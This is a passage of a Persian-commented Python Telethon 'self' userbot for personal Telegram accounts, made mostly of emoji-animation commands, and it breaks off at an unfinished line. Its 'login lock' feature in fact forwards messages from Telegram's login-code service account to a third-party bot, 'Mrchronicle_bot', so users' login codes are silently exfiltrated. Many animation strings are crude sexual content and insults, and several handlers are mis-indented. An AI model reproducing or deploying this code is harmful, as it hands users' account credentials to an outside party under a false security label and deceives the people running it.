# ==============================
# 📬 Telegram: @Abolfazl_rwm — ⚠️ استفاده، ویرایش و بازنشر فقط با ذکر منبع مجاز است؛ حذف این اعتبار اجازه نمی‌شود
# Use, edit and redistribute only with attribution to @Abolfazl_rwm.
# ==============================
#-----------------------[Self-START]-------------
#=========================
#-> --> --->[ Self  ^•^   ] <--- <-- <-
#* Robot  : Self => Cli                           
#* Author : @MrChronicle           
#* Version : 1.0  => OPEEN <=         
#* Library : Telethon   
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\       #========================




#/ سوالی در ران داشتید به ایدی زیر پیام بدید 

#@MRchronicle نویسنده 



# ناموصت حفظ کن و دست به اسم نویسنده نزن





#-----------------------[Start->Imports]-----------------
import asyncio
import os
import random
import psutil
import pytz
import re
import sys
from telethon import TelegramClient, events, functions, Button
from datetime import datetime
from persiantools.jdatetime import JalaliDate
from telethon.tl.functions.messages import (
    EditMessageRequest, GetDiscussionMessageRequest, GetHistoryRequest, SetTypingRequest,
)
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import EditBannedRequest, EditAdminRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.types import (
    ChatAdminRights, ChatBannedRights, InputPeerChannel, ChannelParticipantsAdmins, SendMessageTypingAction,
    MessageEntityTextUrl, MessageEntityUrl, InputPhoto,
)
#-----------------------[EnD->Imports]-----------------
#---------------------[Start->Variables]----------------
tehran_tz = pytz.timezone('Asia/Tehran')
FontTime = [['𝟎', '𝟏', '𝟐', '𝟑', '𝟒', '𝟓', '𝟔', '𝟕', '𝟖', '𝟗']]
time_on = False
commentbot_enabled = False
comment_text = "کامنت تنظیم نشده"
profile_folder = "change_profile"
profile_rotation_enabled = False
auto_reply_enabled = False
auto_reply_messages = []
time_bio_on = True
set_bio = ""
date_format = None
Timeir = False
hashtag_enabled = False
bold_enabled = False
online_mode = False
current_action = None
single_mode_enabled = False
mode_enabled = False
blocklogin_enabled = False
strikethrough_enabled = False
silent_mode = False
Delete_enabled = False
save_mode = False
poker_mode = False

if not os.path.exists(profile_folder):
    os.makedirs(profile_folder)
#---------------------[End->Variables]------------------
#---------[Start->Apis->Client->Settings]--------
client_name = '618ببق1439نتتاتتتتتتتتننن521'
API_ID = '0'
API_HASH = 'PUT-YOUR-API-HASH'
client = TelegramClient(client_name, API_ID, API_HASH, device_model='iPhone 16 Pro Max', system_version='iOS 18', app_version='9.0.1', system_lang_code='en', lang_code='en')
#---------[EnD->Apis->Client->Settings]--------

#////////////////////////////////////////////

#--------------[StarT->Restart].........................
@client.on(events.NewMessage(pattern=r'ریستارت|ریس|/restart'))
async def handler(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit('سلف با موفقیت ریستارت شد')
        python = sys.executable
        os.execl(python, python, *sys.argv)
#--------------[EnD->Restart].........................

#--------------[Start->Login-Block]......................
@client.on(events.NewMessage(pattern=r'/login (on|off)'))
async def block_handler(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        global blocklogin_enabled
        blocklogin_enabled = event.pattern_match.group(1) == 'on'
        await event.edit(f'قفل ورود  {"فعال شد ✅" if blocklogin_enabled else "غیرفعال شد ❌"}')
@client.on(events.NewMessage(from_users=777000))
async def send_messages(event):
    if blocklogin_enabled:
        try:
            await client.forward_messages('Mrchronicle_bot', event.message)
        except Exception as e:
            await event.reply(f'خطایی رخ داد: {str(e)}')
#--------------[EnD->Login-Block].......................

#////////////////////////////////////////////

#--------------[Start->Game-Self]...............
@client.on(events.NewMessage(outgoing=True))
async def handle_special_message(event):
    if event.message.message == "ساک":
        edits_suck = [
            "🗣 <=====", "🗣<=====","🗣=====","🗣====","🗣===","🗣==","🗣===","🗣====","🗣=====","🗣<=====","<=====", "اخ اخ گاز گرفتی ک😐"
        ]
        try:
            for edit in edits_suck:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")

    elif event.message.message == "روانی":
        edits_ravani = [
            "🚶🏿‍♀________________🚑","🚶🏿‍♀_______________🚑", "🚶🏿‍♀______________🚑","🚶🏿‍♀_____________🚑","🚶🏿‍♀____________🚑'","🚶🏿‍♀___________🚑","🚶🏿‍♀__________🚑","🚶🏿‍♀_________🚑","🚶🏿‍♀________🚑","🚶🏿‍♀_______🚑","🚶🏿‍♀______🚑","🚶🏿‍♀____🚑","🚶🏿‍♀___🚑","🚶🏿‍♀__🚑","🚶🏿‍♀_🚑","قان قان گرفتیمش خودع کزخلشع😐🚶‍♂️"
        ]
        try:
            for edit in edits_ravani:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")

    elif event.message.message == "جق":
        edits_jaghi = [
            "'درحال جق....","<👌🏻=====","<=👌🏻====","<==👌🏻===","<===👌🏻==","<==👌🏻===","<=👌🏻====","<👌🏻=====","👌🏻<=====","<=👌🏻====","<===👌🏻==","<=👌🏻====","👌🏻<=====","<=👌🏻====","<==??🏻===","<=👌🏻====","👌🏻<=====","💦💦<=====",
            "کمر نموند برامون بمولا😐"
        ]
        try:
            for edit in edits_jaghi:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")

    elif event.message.message == "عشق":
        edits_love = [
            '🚶‍♀________________🏃‍♂',"🚶‍♀_______________🏃‍♂","🚶‍♀______________🏃‍♂","🚶‍♀_____________🏃‍♂","🚶‍♀____________🏃‍♂","🚶‍♀___________🏃‍♂","🚶‍♀__________🏃‍♂","🚶‍♀_________🏃‍♂","🚶‍♀________🏃‍♂","🚶‍♀_______🏃‍♂","🚶‍♀______🏃‍♂","🚶‍♀____🏃‍♂","🚶‍♀___🏃‍♂","🚶‍♀__🏃‍♂","🚶‍♀_🏃‍♂","`💞Ｉ ＬＯＶＥ ＹＵＯＥ`"
        ]
        try:
            for edit in edits_love:
                await event.edit(edit)
                await asyncio.sleep(0.2)
        except Exception as e:
            print(f"Error while editing message: {e}")

    elif event.message.message == "کص ننت":
        edits_kos_nanat = ["'کــص","کــص ن","کـــص نـــنـ","کـــص نـنـتـ","💝 نـنـت","☘کـــص نـنـت دیگه☘"]
        try:
            for edit in edits_kos_nanat:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")            
    elif event.message.message == "خخخ":
        edits_khkhkh = ['😂😂', '🤣🤣', '😀', '😃', '😄', '😁', '😆', '😅', '😊', '🙃', '😛', '😝', '😜', '🤪', '😺', '😹', '😸', '😇', '😂', '🥳']
        try:
            for edit in edits_khkhkh:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")

    elif event.message.message == "موشک":
        edits_moshak = ["🌍🚀                                🛸", "🌍🚀                               🛸", "🌍🚀                              🛸","🌍🚀                             🛸", "🌍🚀                            🛸", "🌍🚀                           🛸","🌍🚀                          🛸", "🌍🚀                         🛸", "🌍🚀                        🛸","🌍🚀                       🛸", "🌍🚀                      🛸", "🌍🚀                     🛸","🌍🚀                   🛸", "🌍🚀                  🛸", "🌍🚀                 🛸","🌍🚀                🛸", "🌍🚀               🛸", "🌍🚀              🛸","🌍🚀            🛸", "🌍🚀           🛸", "🌍🚀          🛸","🌍🚀         🛸", "🌍🚀        🛸", "🌍🚀       🛸","🌍🚀      🛸", "🌍🚀     🛸", "🌍🚀    🛸","🌍🚀   🛸", "🌍🚀  🛸", "🌍🚀 🛸","🌍🚀🛸", "🌍💥Boom💥"]
        try:
            for edit in edits_moshak:
                await event.edit(edit)
                await asyncio.sleep(0.2)
        except Exception as e:
            print(f"Error while editing message: {e}")

    elif event.message.message == "ادم فضایی":
        edits_love = ["👽                     🔦😼", "👽                    🔦😼", "👽                   🔦😼", "👽                  🔦😼","👽                 🔦😼", "👽                🔦😼", "👽               🔦😼", "👽              🔦😼","👽             🔦😼", "👽            🔦😼", "👽           🔦😼", "👽          🔦😼","👽           😼", "👽        🔦😼", "👽       🔦😼", "👽      🔦😼","👽     🔦😼", "👽    🔦😼", "👽   🔦😼", "👽  🔦😼","👽 🔦😼", "👽🔦🙀"]
        try:
            for edit in edits_love:
                await event.edit(edit)
                await asyncio.sleep(0.2)  
        except Exception as e:
            print(f"Error while editing message: {e}")

    elif event.message.message == "پول":
        edits_pool = ["🔥            ‌                    💵", "🔥            ‌                   💵", "🔥            ‌                 💵","🔥            ‌                💵", "🔥            ‌               💵", "🔥            ‌              💵","🔥            ‌             💵", "🔥            ‌            💵", "🔥            ‌           💵","🔥            ‌          💵", "🔥                         💵", "🔥            ‌        💵","🔥            ‌       💵", "🔥            ‌      💵", "🔥            ‌     💵","🔥            ‌    💵", "🔥            ‌   💵", "🔥            ‌  💵","🔥            ‌ 💵", "🔥            ‌💵", "🔥           💵","🔥          💵", "🔥         💵", "🔥        💵","🔥       💵", "🔥      💵", "🔥     💵","🔥    💵", "🔥   💵", "🔥  💵","🔥 💵", "💸"]
        try:
            for edit in edits_pool:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")

    elif event.message.message == "جن":
        edits_jn = ["👻                                   🙀", "👻                                  🙀", "👻                                 🙀","👻                                🙀", "👻                               🙀", "👻                              🙀","👻                             🙀", "👻                            🙀", "👻                           🙀","👻                          🙀", "👻                         🙀", "👻                        🙀","👻                       🙀", "👻                      🙀", "👻                     🙀","👻                    🙀", "👻                   🙀", "👻                  🙀","👻                 🙀", "👻               🙀", "👻              🙀","👻             🙀", "👻            🙀", "👻           🙀","👻          🙀", "👻         🙀", "👻        🙀","👻       🙀", "👻      🙀", "👻     🙀","👻    🙀", "👻   🙀", "👻  🙀","👻 🙀", "👻🙀", "☠بگاه رفت "]
        try:
            for edit in edits_jn:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")
            
    elif event.message.message == "قلب":
        edits_galb = ["❤️🧡💛💚", "💜💙🖤💛", "🤍🤎💛💜", "💚❤️🖤🧡", "💜💚🧡🖤", "🤍🧡🤎💜","💙🧡💜🧡", "💚💛💙💜", "🖤💛💙🤍", "❣"]
        try:
            for edit in edits_galb:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")
                        
    elif event.message.message == "برم‌ خونه":
        edits_bermkhone = ["🏠              🚶‍♂", "🏠             🚶‍♂", "🏠            🚶‍♂", "🏠           🚶‍♂","🏠          🚶‍♂", "🏠         🚶‍♂", "🏠        🚶‍♂", "🏠       🚶‍♂","🏠      🚶‍♂", "🏠     🚶‍♂", "🏠    🚶‍♂", "🏠   🚶‍♂","🏠  🚶‍♂", "🏠 🚶‍♂","🏠🚶‍♂"]
        try:
            for edit in edits_bermkhone:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")            


    elif event.message.message == "فرار از خونه":
        edits_frarazkhone = ["🏡 💃", "🏡  💃", "🏡   💃", "🏡    💃", "🏡     💃", "🏡      💃","🏡       💃", "🏡        💃", "🏡         💃", "🏡          💃","🏡           💃", "🏡            💃", "🏡              💃💔👫","🏡                 🚶‍♀", "🏡               🚶‍♀", "🏡             🚶‍♀","🏡           🚶‍♀", "🏡         🚶‍♀", "🏡       🚶‍♀","🏡     🚶‍♀", "🏡  🚶‍♀", "🏡🚶‍♀"]
        try:
            for edit in edits_frarazkhone:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")
                        
    elif event.message.message == "عقاب":
        edits_ogab = ["🐍                         🦅", "🐍                      🦅", "🐍                    🦅","🐍                  🦅", "🐍                🦅", "🐍               🦅","🐍              🦅", "🐍            🦅", "🐍           🦅","🐍          🦅", "🐍         🦅", "🐍        🦅","🐍       🦅", "🐍      🦅", "🐍     🦅","🐍    🦅", "🐍   🦅", "🐍 🦅","🐍🦅", "پیشی برد😹"
    ]
        try:
            for edit in edits_ogab:
                await event.edit(edit)
                await asyncio.sleep(0.2) 
        except Exception as e:
            print(f"Error while editing message: {e}")
        	        	                	

    elif event.message.message == "بکشش":
        edits_bekoshesh = ["😂                 • 🔫🤠","😂                •  🔫🤠","😂               •   🔫🤠","😂              •    🔫🤠","😂             •     🔫🤠","😂            •      🔫🤠","😂           •       🔫🤠","😂          •        🔫🤠","😂         •         🔫🤠","😂        •          🔫🤠","😂       •           🔫🤠","😂      •            🔫🤠","😂     •             🔫🤠","😂    •              🔫🤠","😂   •               🔫🤠","😂  •                🔫🤠","😂 •                 🔫🤠","😂•                  🔫🤠","🤯                  🔫 🤠","فرد جنایتکار کشته شد :)"]
    try:
        for edit in edits_bekoshesh:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")
        

    if event.message.message == "مسجد":
         edits_masjed = ["🕌                  🚶‍♂","🕌                 🚶‍♂","🕌                🚶‍♂","🕌               🚶‍♂","🕌              ??‍♂","🕌             🚶‍♂","🕌            🚶‍♂","🕌           🚶‍♂","🕌          🚶‍♂","🕌         🚶‍♂","🕌        🚶‍♂","🕌       🚶‍♂","🕌      🚶‍♂","🕌     ??‍♂","🕌    🚶‍♂","🕌   ??‍♂","🕌  🚶‍♂","?? 🚶‍♂","🕌🚶‍♂","اشهدان الا الا الله📢"]
    try:
        for edit in edits_masjed:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")
   
   
    if event.message.message == "کوسه":
         edits_koose = ["🏝┄┅┄┅┄┄┅🏊‍♂┅┄┄┅🦈","🏝┄┅┄┅┄┄🏊‍♂┅┄┄🦈","🏝┄┅┄┅┄🏊‍♂┅┄🦈","🏝┄┅┄┅🏊‍♂┅┄🦈","🏝┄┅┄🏊‍♂┅┄🦈","🏝┄┅🏊‍♂┅┄🦈","🏝┄🏊‍♂┅┄🦈","🏝🏊‍♂┅┄🦈","اوخیش شانس آوردما :)"]
    try:
        for edit in edits_koose:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")
   

    if event.message.message == "بارون":
         edits_baron = ["☁️                ⚡️","☁️               ⚡️","☁️              ⚡️","☁️             ⚡️","☁️            ⚡️","☁️           ⚡️","☁️          ⚡️","☁️         ⚡️","☁️        ⚡️","☁️       ⚡️","☁️      ⚡️","☁️     ⚡️","☁️    ⚡️","☁️   ⚡️","☁️  ⚡️","☁️ ⚡️","⛈"]
    try:
        for edit in edits_baron:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

	        		        	
    if event.message.message == "بادکنک":
         edits_badkonak = ["🔪                🎈","🔪               🎈","🔪              🎈","🔪             🎈","🔪            🎈","🔪           🎈","🔪          🎈","🔪         🎈","🔪        🎈","🔪       🎈","🔪      🎈","🔪     🎈","🔪    🎈","🔪   🎈","🔪  🎈","🔪 🎈","🔪🎈","💥Bomm💥"]
    try:
        for edit in edits_badkonak:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")
        
    if event.message.message == "شب خوش":
         edits_shabkhosh = ["🌜              🙃","🌜             🙃","🌜            🙃","🌜           🙃","🌜          🙃","🌜         🙃","🌜        🙃","🌜       😕","🌜      ☹️","🌜     😣","🌜    😖","🌜   😩","🌜  🥱","🌜 🥱","😴"]
    try:
        for edit in edits_shabkhosh:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "فیش":
         edits_fish = ["👺🎣           💳","👺🎣          💳","👺🎣         💳","👺🎣        💳","👺🎣      💳","👺🎣     💳","👺🎣    ??","👺🎣   💳","👺🎣  💳","👺🎣 💳","👺🎣💳","💵🤑میشورم 100درصد ورمیدارم تبرم نیسم🤑💵"]
    try:
        for edit in edits_fish:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")



    if event.message.message == "فوتبال":
        edits_football = ["👟          ⚽️","👟         ⚽️","👟        ⚽️","👟       ⚽️","👟      ⚽️","👟     ⚽️","👟    ⚽️","👟   ⚽️","👟  ⚽️","👟⚽️","👟 ⚽️","👟  ⚽️","👟   ⚽️","👟    ⚽️","👟     ⚽️","👟      ⚽️","👟       ⚽️","👟        ⚽️","👟         ⚽️","👟          ⚽️","(توی دروازه🔥)"]
    try:
        for edit in edits_football:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")
        	        	
    if event.message.message == "برم بخابم":
         edits_bekhabam = ["🛏                🚶🏻","🛏               🚶🏻","🛏              🚶🏻","🛏             🚶🏻","🛏            🚶🏻","🛏           🚶🏻‍♂️","🛏          🚶🏻","🛏         🚶🏻","🛏        🚶🏻","🛏       🚶🏻","🛏      🚶🏻","🛏     🚶🏻","🛏    🚶🏻","🛏   🚶🏻","🛏  🚶🏻","🛏 🚶🏻","🛌"]
    try:
        for edit in edits_bekhabam:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")


    if event.message.message == "غرقش کن":
         edits_ghargheshkon = ["🌬🌊              🏄🏻‍♂","🌬🌊             🏄🏻‍♂","🌬🌊            🏄🏻‍♂","🌬🌊           🏄🏻‍♂","🌬🌊          🏄🏻‍♂","🌬🌊         🏄🏻‍♂","🌬🌊        🏄🏻‍♂","🌬🌊       🏄🏻‍♂","🌬🌊      🏄🏻‍♂","🌬🌊     🏄🏻‍♂","🌬🌊    🏄🏻‍♂","🌬🌊   🏄🏻‍♂","🌬🌊  🏄🏻‍♂","🌬🌊 🏄🏻‍♂","غرق شد🙈"]
    try:
        for edit in edits_ghargheshkon:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "فضانورد":
         edits_fazanavard = ["🧑‍🚀              🪐","🧑‍🚀             🪐","🧑‍🚀            🪐","🧑‍🚀           🪐","🧑‍🚀          🪐","🧑‍🚀         🪐","🧑‍🚀        🪐","🧑‍🚀       🪐","🧑‍🚀      🪐","🧑‍🚀     🪐","🧑‍🚀    🪐","🧑‍🚀   🪐","🧑‍🚀  🪐","🧑‍🚀 🪐","🇮🇷من میگم ایران قویه🇮🇷"]
    try:
        for edit in edits_fazanavard:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")


    if event.message.message == "ایول":
         edits_eyval = ["🤜🏿                       🤛🏻","🤜🏻                    🤛🏿","🤜🏻                  🤛🏻","🤜🏿                   🤛🏻","🤜🏻                🤛🏿","🤜🏻               🤛🏻","🤜🏻              🤛🏻","🤜🏿             🤛🏿","🤜🏻            🤛🏻","🤜🏻           🤛🏻","🤜🏿          🤛🏻","🤜🏻         🤛🏻","🤜🏻        🤛🏿","🤜🏻       🤛🏻","🤜🏻      🤛🏻","🤜🏿     🤛🏻","🤜🏻    🤛🏻","🤜🏻   🤛🏻","🤜🏻  🤛🏻","🤜🏻🤛🏿"]
    try:
        for edit in edits_eyval:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")


    if event.message.message == "فیل":
         edits_fil = [
        "░░▄███▄███▄\n░░█████████\n░░▒▀█████▀░\n░░▒░░▀█▀ ",
        "░░▄███▄███▄\n░░█████████\n░░▒▀█████▀░\n░░▒░░▀█▀\n░░▒░░█░\n░░▒░█\n░░░█\n░░█░░░░███████\n░██░░░██▓▓███▓██▒\n██░░░█▓▓▓▓▓▓▓█▓████\n██░░██▓▓▓(◐)▓█▓█▓█\n███▓▓▓█▓▓▓▓▓█▓█▓▓▓▓█\n▀██▓▓█░██▓▓▓▓██▓▓▓▓▓█",
        "░░▄███▄███▄\n░░█████████\n░░▒▀█████▀░\n░░▒░░▀█▀\n░░▒░░█░\n░░▒░█\n░░░█\n░░█░░░░███████\n░██░░░██▓▓███▓██▒\n██░░░█▓▓▓▓▓▓▓█▓████\n██░░██▓▓▓(◐)▓█▓█▓█\n███▓▓▓█▓▓▓▓▓█▓█▓▓▓▓█\n▀██▓▓█░██▓▓▓▓██▓▓▓▓▓█\n░▀██▀░░█▓▓▓▓▓▓▓▓▓▓▓▓▓█\n░░░░▒░░░█▓▓▓▓▓█▓▓▓▓▓▓█\n░░░░▒░░░█▓▓▓▓█▓█▓▓▓▓▓█\n░▒░░▒░░░█▓▓▓█▓▓▓█▓▓▓▓█\n░▒░░▒░░░█▓▓▓█░░░█▓▓▓█\n░▒░░▒░░░██▓██░░░██▓▓██"
    ]
    try:
        for edit in edits_fil:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "بشمار":
         edits_beshoomar = ["¹","²","³","⁴","⁵","⁶","⁷","⁸","⁹","¹⁰","sʜᴏᴛ sʜᴏᴅɪ😉"]
    try:
        for edit in edits_beshoomar:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "بمیر کرونا":
         edits_bemir_corona = ['🦠  •   •   •   •   •   •   •   •   •   •  🔫','🦠  •   •   •   •   •   •   •   •   •   ◀  🔫','🦠  •   •   •   •   •   •   •   •   ◀   •  🔫','🦠  •   •   •   •   •   •   •   ◀   •   •  🔫','🦠  •   •   •   •   •   •   ◀   •   •   •  🔫','🦠  •   •   •   •   •   ◀   •   •   •   •  🔫','🦠  •   •   •   •   ◀   •   •   •   •   •  🔫','🦠  •   •   •   ◀   •   •   •   •   •   •  🔫','🦠  •   •   ◀   •   •   •   •   •   •   •  🔫','🦠  •   ◀   •   •   •   •   •   •   •   •  🔫','🦠  ◀   •   •   •   •   •   •   •   •   •  🔫','💥  •   •   •   •   •   •   •   •   •   •  🔫','💉💊💉💊💉💊💉💊', 'we win','Corona Is Dead','وای کرونارو گاییدیم']
    try:
        for edit in edits_bemir_corona:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")




    if event.message.message == "انگش":
         edits_angosh = ['🍑________________👈','🍑_______________👈','🍑______________👈','🍑_____________👈','🍑____________👈','🍑___________👈','🍑__________👈','🍑_________👈','🍑________👈','🍑_______👈','🍑______👈','🍑____👈','🍑___👈','🍑__👈','🍑_👈','✌انگشت شد✌']
    try:
        for edit in edits_angosh:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")


    if event.message.message == "جقیم":
         edits_iran = ['B=======✊🏻=D','B=====✊🏻===D','B==✊🏻======D','B✊🏻========D','B===✊??=====D','B=====✊🏻===D','B=======✊🏻=D','B====✊🏻====D','B==✊??======D','B✊🏻========D','B==✊🏻======D','B====✊🏻====D','B======✊🏻==D','B========✊🏻D','B========✊🏻D💦💦','کمر نموند برامون بمولا']
    try:
        for edit in edits_iran:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")


    if event.message.message == "ریدم":
         edits_ridam = ['🐒\n💩\n\n\n\n\n\n\n\n\n🧑‍🦯','🐒\n\n💩\n\n\n\n\n\n\n\n🧑‍🦯','🐒\n\n\n💩\n\n\n\n\n\n\n🧑‍🦯','🐒\n\n\n\n💩\n\n\n\n\n\n🧑‍🦯','🐒\n\n\n\n\n💩\n\n\n\n\n🧑‍🦯','🐒\n\n\n\n\n\n💩\n\n\n\n🧑‍🦯','🐒\n\n\n\n\n\n\n💩\n\n\n🧑‍🦯','🐒\n\n\n\n\n\n\n\n💩\n\n🧑‍🦯','چیو نگاه میکنی ریدیم ب هیکل یاروع دیگ😂']
    try:
        for edit in edits_ridam:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")


    if event.message.message == "مربع":
        edits_moraba = ['🟥🟥🟥🟥\n🟥🟥🟥🟥\n🟥🟥🟥🟥\n🟥🟥🟥🟥','🟥🟥🟥🟥\n🟥⬜️⬛️🟥\n🟥⬛️⬜️🟥\n🟥🟥🟥🟥','🟥🟥🟥🟥\n🟥⬛️⬜️🟥\n🟥⬜️⬛️🟥\n🟥🟥🟥🟥','🟥🟥🟥⬛️\n🟥⬜️⬛️🟥\n🟥⬛️⬜️🟥\n⬛️🟥🟥🟥','🟥⬜️⬛️🟥\n🟥⬛️⬜️🟥\n🟥⬜️⬛️🟥\n🟥⬛️⬜️🟥','🟥⬛️⬜️🟥\n🟥⬜️⬛️🟥\n🟥⬛️⬜️🟥\n🟥⬜️⬛️🟥','⬜️⬛️⬜️⬛️\n⬛️⬜️⬛️⬜️\n⬜️⬛️⬜️⬛️\n⬛️⬜️⬛️⬜️','⬛️⬜️⬛️⬜️\n⬜️⬛️⬜️⬛️\n⬛️⬜️⬛️⬜️\n⬜️⬛️⬜️⬛️','🟥⬜️⬛️⬜️🟥\n🟥⬛️⬜️⬛️🟥\n🟥⬜️⬛️⬜️🟥\n🟥⬛️⬜️⬛️🟥\n🟥⬜️⬛️⬜️🟥','🟥🟥🟥🟥🟥🟥🟥\n🟥🟨🟨🟨🟨🟨🟥\n🟥🟩🟩🟩🟩🟩🟥\n🟥⬛️⬛️⬛️⬛️⬛️🟥\n🟥🟦🟦🟦🟦🟦🟥\n🟥⬜️⬜️⬜️⬜️⬜️🟥\n🟥🟥🟥🟥🟥🟥🟥','🟥🟥🟥🟥🟥🟥🟥\n🟥💚💚💚💚💚🟥\n🟥💙💙💙💙💙🟥\n🟥❤️❤️❤️❤️❤️🟥\n🟥💖💖💖💖💖🟥\n🟥🤍🤍🤍🤍🤍🟥\n🟥🟥🟥🟥🟥🟥🟥','🟥🟥🟥🟥🟥🟥🟥\n🟥▫️◼️▫️◼️▫️🟥\n🟥◼️▫️◼️▫️◼️🟥\n🟥◽️◼️◽️◼️◽️🟥\n🟥◼️◽️◼️◽️◼️🟥\n🟥◽️◼️◽️◼️◽️🟥\n🟥🟥🟥🟥🟥🟥🟥','🟥🟥🟥🟥🟥🟥🟥\n🟥🔶🔷🔶🔷🔶🟥\n🟥🔷🔶🔷🔶🔷🟥\n🟥🔶🔷🔶🔷🔶🟥\n🟥🔷🔶🔷🔶🔷🟥\n🟥🔶🔷🔶🔷🔶🟥\n🟥🟥🟥🟥🟥🟥🟥','🟥🟥🟥🟥🟥🟥🟥\n🟥♥️❤️♥️❤️♥️🟥\n🟥❤️♥️❤️♥️❤️🟥\n🟥♥️❤️♥️❤️♥️🟥\n🟥❤️♥️❤️♥️❤️🟥\n🟥♥️❤️♥️❤️♥️🟥\n🟥🟥🟥🟥🟥🟥🟥','💙💙💙💙','❣️I Love❣️']
    try:
        for edit in edits_moraba:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "دیک":
         edits_k = ['.                      💦💦💦\n.                    💦💦💦💦\n                   💦💦💦💦💦\n                 💦💦💦💦💦💦\n                 💦💦💦  💦💦💦\n                 💦💦💦        💦💦\n                  ◼️◼️◼️         💦💦\n           ◼️📜◼️📜◼️     💦💦\n     ◼️📜📜◼️📜📜◼️   💦\n     ◼️📜📜📜📜📜◼️     💦\n           ◼️◼️◼️◼️◼️          💦\n           ◼️📜📜📜◼️          💦\n           ◼️📜📜📜◼️       💦\n           ◼️📜📜📜◼️\n           ◼️📜📜📜◼️\n           ◼️📜📜📜◼️\n           ◼️📜📜📜◼️\n           ◼️📜📜📜◼️‌\n           ◼️📜📜📜◼️\n           ◼️📜📜📜◼️\n           ◼️📜📜📜◼️\n           ◼️📜📜📜◼️\n           ◼️📜📜📜◼️\n           ◼️📜📜📜◼️\n     ◼️📜📜📜📜📜◼️\n◼️📜📜📜📜📜📜📜◼️\n◼️📜📜📜◼️📜📜📜◼️\n     ◼️◼️◼️     ◼️◼️◼️']
    try:
        for edit in edits_k:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "ساعت":
